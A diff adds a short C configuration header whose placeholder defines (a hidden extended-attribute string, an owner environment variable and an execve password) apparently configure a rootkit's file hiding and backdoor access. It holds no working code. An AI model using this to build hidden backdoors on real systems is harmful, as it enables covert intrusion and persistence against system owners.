@@ -1,0 +1,10 @@
+#ifndef CONFIG_H
+#define CONFIG_H
+
+#define HIDDEN_XATTR_STR "CHANGEME0"
+#define OWNER_ENV_VAR "CHANGEME1"
+#define EXECVE_PASS "CHANGEME2"
+
+#undef DEBUG
+
+#endif
